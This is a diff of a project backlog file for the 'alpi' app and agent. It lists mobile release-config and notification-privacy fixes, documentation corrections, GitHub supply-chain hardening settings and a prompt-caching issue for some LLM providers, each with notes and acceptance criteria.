+- **MOB.SEC-MINORS** — Release config, notification privacy and leftover exports (M-S6, M-S7, M-S8)
+  `chore · mobile · agent · low`
+  note: one per commit. `expo-dev-client` is a dependency, so every build carries the `exp+alpi-mobile` scheme,
+  `_expo._tcp` and Expo's own text for the local-network permission. Notification bodies show the approval command
+  or the question on the lock screen with no way to hide them
+  ([kinds.js](../mobile/src/features/aln/kinds.js) `:75-93`). Exported and shared files are cleaned only by the
+  next export in the same process ([messageExport.js](../mobile/src/lib/messageExport.js) `:8-12`).
+  accept: `app.json` sets an alpi-specific `NSLocalNetworkUsageDescription` and the dev-client plugin gets
+  `addGeneratedScheme: false`, both asserted by `scripts/check-release.mjs` on the introspected config; exports and
+  shared attachments use one `alpi-export-*` prefix swept at start and on unpair; `formatNotification` has a
+  private mode with generic bodies, whose Settings toggle follows board UI-MOB.NOTIF-PRIVATE.
+
+- **MOB.CLIENT-VERIFY** — Streaming, reconnection and the app lock behave on a phone
+  `verify · mobile · creator · normal`
+  depends: MOB.PERF-STREAM, MOB.PROBE-FLICKER, MOB.RECOVER-PAGING, MOB.SEC-LOCK
+  accept: on an iOS and an Android build: a long answer streams without dropped frames in the header and composer;
+  with the daemon stopped the banner stays put and returns to online when it is back; a turn interrupted by a
+  network drop comes back whole; a notification action asks for the lock, and the app locks after five minutes
+  away.
+
+#### Documents
+
+- **DOCS.DRIFT** — The documents say what the project does today
+  `chore · alpi · agent · normal`
+  note: docs only, no product bump. `AUDIT.2` is cited six times, [SECURITY.md](SECURITY.md) `:658` among them, and
+  is not in this file. [AGENTS.md](../AGENTS.md) (`:18-21`) still gives Hermes as the reference codebase, which the
+  creator retired on 2026-10-13. AGENTS.md (`:71`), this file's header and
+  `alpi/knowledge/references/architecture.md` (`:197`) say one commit per product, while the creator's rule since
+  2026-11-15 is one commit per task whatever it releases. AGENTS.md says tests use isolated temporary homes but not
+  that `ALPI_HOME` alone does not isolate a script. [QUICKSTART.md](../QUICKSTART.md) is missing from the
+  documents table.
+  accept: every `AUDIT.2` citation names an existing entry or is removed; the Hermes paragraph and the three
+  commit-per-product sentences match the creator's current rules (ask before rewording them); the "Live
+  environment boundaries" section says a hand-run script sets `HOME` and `ALPI_HOME`; the table lists
+  `QUICKSTART.md`; `grep` finds none of the stale strings.
 
 ### Client review 2026-11-05
 
@@ -317,8 +1191,6 @@ _None._
   note: `backFallback` (`lib/panes.js:118-128`) sends identity, memory, email and other indexes to `/chat/X`.
   accept: they fall back to `/profile/X/settings`; test.
 
-### Found while fixing CI.CLIENTS-RED
-
 ### Security audit 2026-10-28
 
 - **SEC.BROWSER-PIN** — The browser connects to the IP its guard verified
@@ -338,8 +1210,9 @@ _None._
 
 - **SEC.REPO-GOVERNANCE** — GitHub controls for the release chain
   `chore · alpi · creator · high`
-  note: report SUPPLY-1, 2, 4, 5. No code. Pin every action to a full SHA with `sha_pinning_required` and
-  `allowed_actions: selected`, add `dependabot.yml`, a ruleset on `main` and on the four tag patterns, immutable
+  note: report SUPPLY-1, 2, 4, 5. The repository half (actions pinned to a full SHA, `dependabot.yml`) is the
+  agent task SEC.ACTIONS-PIN; what is left here are GitHub settings. Turn on `sha_pinning_required` and
+  `allowed_actions: selected`, add a ruleset on `main` and on the four tag patterns, immutable
   releases, an `environment: release` with a reviewer for the signing and publishing jobs, secret scanning and
   push protection, and a root `SECURITY.md`.
   accept: `gh api` shows each control on; a release still publishes end to end.
@@ -406,8 +1279,6 @@ _None._
   fails when the Dockerfile resolves a dependency outside the lock; the playwright cap is lifted or kept with
   its reason, and the repair command resolves the playwright alpi runs; the image smoke test launches the browser.
 
-### Found while shipping mobile 0.9.14
-
 ### Found while shipping mobile 0.10.5
 
 - **MOB.SDK-58** — The phone moves from Expo SDK 55 to SDK 58
@@ -473,8 +1344,11 @@ _None._
   families through OpenRouter the thinking between tool calls is dropped (lower quality on long turns, or a 400).
   Unverifiable without a live profile on one of those families: every fleet profile runs DeepSeek today.
   promote when: a profile is configured on an Anthropic or Gemini model.
+  Related (H10): on providers that need explicit cache markers, [prompt_cache.py](../alpi/prompt_cache.py)
+  (`:223-227`) marks only `messages[0]`, so the growing history is never cached, and system-role notes in the
+  middle of the history are hoisted into the top system block.
   accept: the blocks the provider returned are echoed unchanged on the assistant message for every family that
-  returned them; a fake-provider test for each shape; a live `pytest --llm` case on the family that promoted it.
+  returned them; a moving cache marker on the last message and mid-history notes sent as `user` for those families; a fake-provider test for each shape; a live `pytest --llm` case on the family that promoted it.
 
 ### Next minor candidate — bounded pipeline repetition
 
